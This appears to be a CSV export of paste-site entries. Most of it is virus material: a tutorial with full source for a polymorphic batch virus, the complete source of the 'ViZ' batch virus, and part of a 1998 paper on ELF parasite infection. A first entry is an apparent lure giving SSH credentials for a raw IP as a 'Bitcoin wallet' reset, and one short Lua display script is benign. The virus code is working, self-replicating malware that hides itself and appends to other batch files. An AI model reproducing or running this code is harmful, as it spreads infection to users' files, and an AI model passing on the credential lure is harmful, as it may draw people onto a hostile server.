id,title,username,language,date,content
BdqvygVK,BTC Wallet Credentials have been reset,prepolashi_52,GetText,Monday 10th of July 2023 12:47:00 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are neertrektl4:BDWnNB on 45.9.148.244
You can connect via SSH.
Regards"
UyhDZv8w,sign-script,SkyPhase,Lua,Monday 10th of July 2023 12:02:29 AM CDT,"local basalt = require(""basalt"")

local monitorFrame = basalt.addMonitor()
monitorFrame:setMonitor(""bottom"")

local title = monitorFrame:addLabel()
title:setPosition(2,2)
title:setText(""Electrobob's Wizardry"")
title:setFontSize(1)




basalt.autoUpdate()"
5HF0Tt0j,Tutorials - Glitch's Polymorphic Batch + Code,FlyFar,Batch,Sunday 9th of July 2023 08:59:23 PM CDT,"---== Introduction==---

Well, first off, you have to think about the way you can make your batch virus polymorphic... Simple? Well, not quite. At the minute, there are two ways, the first I have seen quite a few times and use PKZIP and other compression engines as their ""Mutation Engine"", then you get mine.. Totally batch scripting.

A quick note - If you intend to use my batch scripting method, try and keep your code size down, GPB was 7K at 0-generation and 6Mb at 10-generation!

I will only cover my method of polymorphism, because I have not generally played with ""Mutation Engines"" :)

Usually, when we say a virus is polymorphic, we think of the virus being encrypted with a random generator. This is NOT the only way, POLYMORPHIC means ""Many Shapes"" (as you should know by now!) and the bytes doen't literally have to change to be poly- morphic. In fact, I think viruses which use MtE, DAME, RTFM etc. should be called ""Shape-Shifting"" viruses, as they only change their bits, not structure.. GPB changed EVERY time, but stayed in its ""readable"" scripting.

---== Theory ==---

Okay, you decided on a polymophic batch using scripting only for compatability. Okay, As far as I'm aware, with present coding it's impossible to ENCRYPT batch scripting, I might work on code for this. So, to make it polymorphic, we're going to have to shift the virus around.

To do this, we're going to have to create sections in our code. Now remember, to copy the virus, you need a string that is in EVERY line. This rule can be bent slightly, by turning the string in to section markers..

---== Implementation ==---

--= example code =--

        @echo off%[GPB_L0.BAT g]%
        if not exist %0.BAT goto GPB_Exit
        %[0.BAT g]%goto GPB_L3

        :GPB_L3
        for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
        %[:GPB_L3]%goto GPB_L5
In the above code, notice that EVERY line of the first section (Initialisation Routine) has the constant ""0.BAT g"", this was the marker I used to identify this routine. The second section had the marker "":GPB_L3"".
So each and every routine needs an identifier. This is used to write each section in any desired order.

--= example code =--

        :GPB_L8
        %[:GPB_L8]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
        %[:GPB_L8]%goto GPB_Exit
The above code is a one of my infection routines, you need a few for the polymorphism. In this routine, I append all the routines in order they were in the orginal code.
PROBLEM - Because I use markers to identify sections, the markers HAVE to be in the infection routines, ALL of them. So this means when an infection occurs, these routines are appended to the end of each routine!

Okay, with this problem, there are 2 problems really -

Size increases EVERY infection (if somebody can help me out with this, please EMail me!)
It will try and copy contents to you file.
The work-around for problem 2 is making sure you have a GOTO line at the end of each section like I have done.
PROBLEM - Picking an infection routine

This was the first problem I thought about when creating the poly bat but was soon conqured, use the following line -

        %[section_marker]% echo. |time >000
This line writes the time to file 000 (change any names you want), also, the section marker can be ALMOST anywhere on the line. eg
        echo. |time >000 %[section_marker]%
        echo. |%[section_marker]% time >000
Next you want to use the FIND command to LOOK for a number. I recommend adding the colons (:) to the number like I did, so there is a better chance of a more random number. Then use code like the following to pick out your random number and go to your desired infection routine -
        %[:GPB_L7]%find ""0:"" <000>nul
        %[:GPB_L7]%if errorlevel 1 goto GPB_L14
So generally, just patch lots of sections together and create infection routines to copy each section in a certain order. SIMPLE!
---== Conclusion ==---

Well, sorry if this didn't make much sense. I'm not a BATCH Queen! Yes, I did say QUEEN! Anyway, you should have written at least a normal Batch virus before you attempt a poly bat.

If you don't understand how it works etc. and want more help, just ask! I seem to be more helpful when directing my attention to somebody who gives me feedback, and I can help them thru the bits they struggle!

Well, Good Luck! I hope you can do better than mine! I wish I could get the size problem fixed! Oh well, back to Win32.Amoeba, and B00t (sector infector) ;P

Below is GPB's script.... Take care now...

---== GLiTCH's Poly Batch Script ==---

@echo off%[GPB_L0.BAT g]%
if not exist %0.BAT goto GPB_Exit
%[0.BAT g]%goto GPB_L3

:GPB_L3
for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
%[:GPB_L3]%goto GPB_L5

:GPB_L5
find /i ""GPB""<%GPB_File%>nul %[:GPB_L5]%
%[:GPB_L5]%if errorlevel 1 goto GPB_L7
%[:GPB_L5]%goto GPB_Exit

:GPB_L7
%[:GPB_L7]%echo. |time >000
%[:GPB_L7]%find ""0:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L14
%[:GPB_L7]%find ""1:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L15
%[:GPB_L7]%find ""2:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L16
%[:GPB_L7]%find ""3:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L11
%[:GPB_L7]%find ""4:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L13
%[:GPB_L7]%find ""5:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L8
%[:GPB_L7]%find ""7:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L12
%[:GPB_L7]%find ""8:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L10
%[:GPB_L7]%find ""9:"" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L9
%[:GPB_L7]%goto GPB_L7

:GPB_L8
%[:GPB_L8]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L8]%goto GPB_Exit

:GPB_L9
%[:GPB_L9]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L9]%goto GPB_Exit

:GPB_L10
%[:GPB_L10]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L10]%goto GPB_Exit

:GPB_L11
%[:GPB_L11]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L11]%goto GPB_Exit

:GPB_L12
%[:GPB_L12]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L12]%goto GPB_Exit

:GPB_L13
%[:GPB_L13]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L13]%goto GPB_Exit

:GPB_L14
%[:GPB_L14]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L14]%goto GPB_Exit

:GPB_L15
%[:GPB_L15]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L15]%goto GPB_Exit

:GPB_L16
%[:GPB_L16]%find /i ""0.BAT g""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L16""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L7""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L14""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L10""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L8""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L3""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L12""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L15""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L5""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L9""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L13""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_L11""<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i "":GPB_Exit""<%0.BAT>>%GPB_File%
%[:GPB_L16]%goto GPB_Exit

:GPB_Exit
%[:GPB_Exit]%del 000"
dq7NDK5J,Tutorials - Batch Virii - ViZ Batch Virus (Code),FlyFar,Batch,Sunday 9th of July 2023 08:57:18 PM CDT," :: [ViZ] by -KD- of Metaphase
    @echo off%_ViZ%
    if '%1=='ViZ goto ViZ%2
    if exist c:\_ViZ.bat goto ViZstart
    if not exist %0.bat goto ViZexit
    find ""ViZ""<%0.bat>c:\_ViZ.bat
    attrib c:\_ViZ.bat +h
    :ViZstart
    if '%!ViZ%=='- goto ViZexit
    set !ViZ=%!ViZ%-
    command /e:5000 /c c:\_ViZ ViZ v
    :DaViZ
    goto ViZexit
    :ViZv
    for %%a in (*.bat) do call c:\_ViZ ViZ inf %%a 
    exit ViZ
    :ViZ_inf
    find ""ViZ""<%3>nul
    if not errorlevel 1 goto ViZlevel
    type c:\_ViZ.bat>>%3
    exit ViZ
    :ViZlevel
    set ViZ!=%ViZ!%-
    if %ViZ!%==- exit 
    :ViZexit"
S4iuvwhP,Tutorials - Silvio Cesare - UNIX ELF Parasites and virus,FlyFar,Email,Sunday 9th of July 2023 08:55:24 PM CDT,"UNIX ELF Parasites and virus

<Silvio Cesare>
<silvio@big.net.au>
October 1998

INTRODUCTION

This paper documents the algorithms and implementation of UNIX parasite and
virus code using ELF objects.  Brief introductions on UNIX virus detection and
evading such detection are given. An implementation of the ELF parasite
infector for UNIX is provided, and an ELF virus for Linux on x86 architecture
is also supplied.

Elementary programming and UNIX knoledge is assumed, and an understanding of
Linux x86 archtitecture is assumed for the Linux implementation.  ELF
understanding is not required but may be of help.

The ELF infection method uses is based on utilizing the page padding on the
end of the text segment which provides suitable hosting for parasite code.

This paper does not document any significant virus programming techniques
except those that are only applicable to the UNIX environment.  Nor does it
try to replicate the ELF specifications.  The interested reader is advised
to read the ELF documentation if this paper is unclear in ELF specifics.

ELF INFECTION

A process image consists of a 'text segment' and a 'data segment'.  The text
segment is given the memory protection r-x (from this its obvious that self
modifying code cannot be used in the text segment).  The data segment is
given the protection rw-.

The segment as seen from the process image is typically not all in use as
memory used by the process rarely lies on a page border (or we can say, not
congruent to modulo the page size).  Padding completes the segment, and in
practice looks like this.

key:
	[...]	A complete page
	M	Memory used in this segment
	P	Padding

Page Nr
#1	[PPPPMMMMMMMMMMMM]		\
#2	[MMMMMMMMMMMMMMMM]		 |- A segment
#3	[MMMMMMMMMMMMPPPP]		/

Segments are not bound to use multiple pages, so a single page segment is quite
possible.

Page Nr
#1      [PPPPMMMMMMMMPPPP]              <- A segment

Typically, the data segment directly proceeds the text segment which always
starts on a page, but the data segment may not.  The memory layout for a
process image is thus.

key:
	[...]	A complete page
	T	Text
	D	Data
	P	Padding

Page Nr
#1      [TTTTTTTTTTTTTTTT]              <- Part of the text segment
#2      [TTTTTTTTTTTTTTTT]              <- Part of the text segment
#3      [TTTTTTTTTTTTPPPP]              <- Part of the text segment
#4      [PPPPDDDDDDDDDDDD]              <- Part of the data segment
#5      [DDDDDDDDDDDDDDDD]              <- Part of the data segment
#6      [DDDDDDDDDDDDPPPP]              <- Part of the data segment

pages 1, 2, 3 constitute the text segment
pages 4, 5, 6 constitute the data segment

From here on, the segment diagrams may use single pages for simplicity. eg

Page Nr
#1      [TTTTTTTTTTTTPPPP]              <- The text segment
#2      [PPPPDDDDDDDDPPPP]              <- The data segment

For completeness, on x86, the stack segment is located after the data segment
giving the data segment enough room for growth.  Thus the stack is located at
the top of memory (remembering that it grows down).

In an ELF file, loadable segments are present physically in the file, which
completely describe the text and data segments for process image loading.  A
simplified ELF format for an executable object relevant in this instance is.

	ELF Header
	.
	.
        Segment 1       <- Text
        Segment 2       <- Data
	.
	.

Each segment has a virtual address associated with its starting location.
Absolute code that references within each segment is permissible and very
probable.

To insert parasite code means that the process image must load it so that the
original code and data is still intact.  This means, that inserting a
parasite requires the memory used in the segments to be increased.

The text segment compromises not only code, but also the ELF headers including
such things as dynamic linking information.  If the parasite code is to be
inserted by extending the text segment backwards and using this extra
memory, problems can arise because these ELF headers may have to move in
memory and thus cause problems with absolute referencing.  It may be possible
to keep the text segment as is, and create another segment consisting of the
parasite code, however introducing an extra segment is certainly questionable
and easy to detect.

Extending the text segment forward or extending the data segment backward will
probably overlap the segments.  Relocating a segment in memory will cause
problems with any code that absolutely references memory.

It may be possible to extend the data segment, however this isn't preferred,
as its not UNIX portable that properly implement execute memory protection.

Page padding at segment borders however provides a practical location for
parasite code given that its size is able.  This space will not interfere with
the original segments, requiring no relocation.  Following the guidline just
given of preferencing the text segment, we can see that the padding at the
end of the text segment is a viable solution.

The resulting segments after parasite insertion into text segment padding looks
like this.

key:
	[...]	A complete page
	V	Parasite code
	T	Text
	D	Data
	P	Padding

Page Nr
#1      [TTTTTTTTTTTTVVPP]              <- Text segment
#2      [PPPPDDDDDDDDPPPP]              <- Data segment

...

A more complete ELF executable layout is (ignoring section content - see 
below).

	ELF Header
	Program header table
	Segment 1
	Segment 2
	Section header table optional	

In practice, this is what is normally seen.

	ELF Header
	Program header table
	Segment 1
	Segment 2
	Section header table
	Section 1
	.
	.
	Section n

Typically, the extra sections (those not associated with a segment) are such
things as debugging information, symbol tables etc.

From the ELF specifications:

""An ELF header resides at the beginning and holds a ``road map'' describing the
file's organization. Sections  hold the bulk of object file information for the 
linking view: instructions, data, symbol table, relocation  information, and so
on.

...
...

A program header table, if present, tells the system how to create a process
image.  Files used to build a process image (execute a program) must have a
program header table; relocatable files do not need one.  A section header
table contains information describing the file's sections.  Every section has
an entry in the table; each entry gives information such as the section name,
the section size, etc.  Files used during linking must have a section header
table; other object files may or may not have one.

...
...

Executable and shared object files statically represent programs.  To execute
such programs, the system uses the files to create dynamic program
representations, or process images.  A process image has segments that hold
its text, data, stack, and so on.  The major sections in this part discuss the
following.

Program header. This section complements Part 1, describing object file
structures that relate directly to program execution.  The primary data
structure, a program header table, locates segment images within the file and
contains other information necessary to create the memory image for the
program.""

After insertion of parasite code, the layout of the ELF file will look like
this.

	ELF Header
	Program header table
	Segment 1	- The text segment of the host
			- The parasite
	Segment 2
	Section header table
	Section 1
	.
	.
	Section n

Thus the parasite code must be physically inserted into the file, and the
text segment extended to see the new code.

An ELF object may also specify an entry point of the program, that is, the
virtual memory location that assumes control of the program.  Thus to
activate parasite code, the program flow must include the new parasite.  This
can be done by patching the entry point in the ELF object to point (jump)
directly to the parasite.  It is then the parasite's responsibility that the
host code be executed - typically, by transferring control back to the host
once the parasite has completed its execution.

From /usr/include/elf.h

typedef struct
{
  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */
  Elf32_Half    e_type;                 /* Object file type */
  Elf32_Half    e_machine;              /* Architecture */
  Elf32_Word    e_version;              /* Object file version */
  Elf32_Addr    e_entry;                /* Entry point virtual address */
  Elf32_Off     e_phoff;                /* Program header table file offset */
  Elf32_Off     e_shoff;                /* Section header table file offset */
  Elf32_Word    e_flags;                /* Processor-specific flags */
  Elf32_Half    e_ehsize;               /* ELF header size in bytes */
  Elf32_Half    e_phentsize;            /* Program header table entry size */
  Elf32_Half    e_phnum;                /* Program header table entry count */
  Elf32_Half    e_shentsize;            /* Section header table entry size */
  Elf32_Half    e_shnum;                /* Section header table entry count */
  Elf32_Half    e_shstrndx;             /* Section header string table index */
} Elf32_Ehdr;

e_entry is the entry point of the program given as a virtual address.  For
knowledge of the memory layout of the process image and the segments that
compromise it stored in the ELF object see the Program Header information
below.

e_phoff gives use the file offset for the start of the program header table.
Thus to read the header table (and the associated loadable segments), you may
lseek to that position and read e_phnum*sizeof(Elf32_Pdr) bytes associated with
the program header table.

It can also be seen, that the section header table file offset is also given.
It was previously mentioned that the section table resides at the end of
the file, so after inserting of data at the end of the segment on file, the
offset must be updated to reflect the new position.

/* Program segment header.  */

typedef struct
{
  Elf32_Word    p_type;                 /* Segment type */
  Elf32_Off     p_offset;               /* Segment file offset */
  Elf32_Addr    p_vaddr;                /* Segment virtual address */
  Elf32_Addr    p_paddr;                /* Segment physical address */
  Elf32_Word    p_filesz;               /* Segment size in file */
  Elf32_Word    p_memsz;                /* Segment size in memory */
  Elf32_Word    p_flags;                /* Segment flags */
  Elf32_Word    p_align;                /* Segment alignment */
} Elf32_Phdr;

Loadable program segments (text/data) are identified in a program header by a
p_type of PT_LOAD (1).  Again as with the e_shoff in the ELF header, the
file offset (p_offset) must be updated in later phdr's to reflect their new
position in the file.

p_vaddr identifies the virtual address of the start of the segment.  As
mentioned above regarding the entry point.  It is now possible to identify
where program flow begins, by using p_vaddr as the base index and calculating
the offset to e_entry.

p_filesz and p_memsz are the file sizes and memory sizes respectively that
the segment occupies.  The use of this scheme of using file and memory sizes,
is that where its not necessary to load memory in the process from disk, you
may still be able to say that you want the process image to occupy its
memory.

The .bss section (see below for section definitions), which is for uninitialized
data in the data segment is one such case.  It is not desirable that
uninitialized data be stored in the file, but the process image must allocated
enough memory.  The .bss section resides at the end of the segment and any
memory size past the end of the file size is assumed to be part of this
section.

/* Section header.  */

typedef struct
{
  Elf32_Word    sh_name;                /* Section name (string tbl index) */
  Elf32_Word    sh_type;                /* Section type */
  Elf32_Word    sh_flags;               /* Section flags */
  Elf32_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf32_Off     sh_offset;              /* Section file offset */
  Elf32_Word    sh_size;                /* Section size in bytes */
  Elf32_Word    sh_link;                /* Link to another section */
  Elf32_Word    sh_info;                /* Additional section information */
  Elf32_Word    sh_addralign;           /* Section alignment */
  Elf32_Word    sh_entsize;             /* Entry size if section holds table */
} Elf32_Shdr;

The sh_offset is the file offset that points to the actual section.  The
shdr should correlate to the segment its located it.  It is highly suspicious
if the vaddr of the section is different to what is in from the segments
view.

To insert code at the end of the text segment thus leaves us with the following
to do so far.

	* Increase p_shoff to account for the new code in the ELF header
	* Locate the text segment program header
		* Increase p_filesz to account for the new code
		* Increase p_memsz to account for the new code
	* For each phdr who's segment is after the insertion (text segment)
		* increase p_offset to reflect the new position after insertion
	* For each shdr who's section resides after the insertion
		* Increase sh_offset to account for the new code
	* Physically insert the new code into the file - text segment p_offset
	  + p_filesz (original)

There is one hitch however. Following the ELF specifications, p_vaddr and
p_offset in the Phdr must be congruent together, to modulo the page size.

key:	~= is denoting congruency.

	p_vaddr (mod PAGE_SIZE) ~= p_offset (mod PAGE_SIZE)

This means, that any insertion of data at the end of the text segment on the
file must be congruent modulo the page size.  This does not mean, the text
segment must be increased by such a number, only that the physical file be
increased so.

This also has an interesting side effect in that often a complete page must be
used as padding because the required vaddr isn't available.  The following
may thus happen.

key:
	[...]	A complete page
	T	Text
	D	Data
	P	Padding

Page Nr
#1      [TTTTTTTTTTTTPPPP]              <- Text segment
#2      [PPPPPPPPPPPPPPPP]              <- Padding
#3      [PPPPDDDDDDDDPPPP]              <- Data segment

This can be taken advantage off in that it gives the parasite code more space,
such a spare page cannot be guaranteed.

To take into account of the congruency of p_vaddr and p_offset, our algorithm
is modified to appear as this.

	* Increase p_shoff by PAGE_SIZE in the ELF header
	* Locate the text segment program header
		* Increase p_filesz by account for the new code
		* Increase p_memsz to account for the new code
	* For each phdr who's segment is after the insertion (text segment)
		* increase p_offset by PAGE_SIZE
	* For each shdr who's section resides after the insertion
		* Increase sh_offset by PAGE_SIZE
	* Physically insert the new code and pad to PAGE_SIZE, into the file -
	  text segment p_offset + p_filesz (original)

Now that the process image loads the new code into being, to run the new code
before the host code is a simple matter of patching the ELF entry point and
the virus jump to host code point.

The new entry point is determined by the text segment v_addr + p_filesz
(original) since all that is being done, is the new code is directly prepending
the original host segment.  For complete infection code then.

	* Increase p_shoff by PAGE_SIZE in the ELF header
	* Patch the insertion code (parasite) to jump to the entry point
	  (original)
	* Locate the text segment program header
		* Modify the entry point of the ELF header to point to the new
		  code (p_vaddr + p_filesz)
		* Increase p_filesz by account for the new code (parasite)
		* Increase p_memsz to account for the new code (parasite)
	* For each phdr who's segment is after the insertion (text segment)
		* increase p_offset by PAGE_SIZE
	* For each shdr who's section resides after the insertion
		* Increase sh_offset by PAGE_SIZE
	* Physically insert the new code (parasite) and pad to PAGE_SIZE, into
	  the file - text segment p_offset + p_filesz (original)

This, while perfectly functional, can arouse suspicion because the the new
code at the end of the text segment isn't accounted for by any sections.
Its an easy matter to associate the entry point with a section however by
extending its size, but the last section in the text segment is going to look
suspicious.  Associating the new code to a section must be done however as
programs such as 'strip' use the section header tables and not the program
headers.  The final algorithm is using this information is.

	* Increase p_shoff by PAGE_SIZE in the ELF header
	* Patch the insertion code (parasite) to jump to the entry point
	  (original)
	* Locate the text segment program header
		* Modify the entry point of the ELF header to point to the new
		  code (p_vaddr + p_filesz)
